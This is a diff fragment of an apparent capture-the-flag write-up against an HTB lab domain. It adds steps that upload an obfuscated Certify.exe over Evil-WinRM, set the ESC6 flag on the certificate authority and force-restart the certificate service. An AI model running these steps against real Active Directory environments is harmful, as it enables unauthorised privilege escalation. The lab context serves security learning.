@@ -1160,7 +1160,9 @@ https://bloodhound.specterops.io/resources/edges/manage-ca#4-enable-esc6-flag-ed
 
 https://github.com/Flangvik/ObfuscatedSharpCollection/blob/main/NetFramework_4.7_Any/Certify.exe._obf.exe
 
-I could not find a precompiled version that wasnt obfuscated,
+I could not find a precompiled version that wasnt obfuscated, but this will work fine
+
+Ill upload it to WINRM
 
 ```python
 *Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> ./Certify.exe._obf.exe manage-ca --ca dc01.fries.htb\fries-DC01-CA --esc6
@@ -1249,7 +1251,13 @@ I could not find a precompiled version that wasnt obfuscated,
 Certify completed in 00:00:00.0078652
 ```
 
+Now the flag has been set
 
+```python
+*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> Restart-Service certsvc -Force
+```
+
+Ill restart
 
 
 
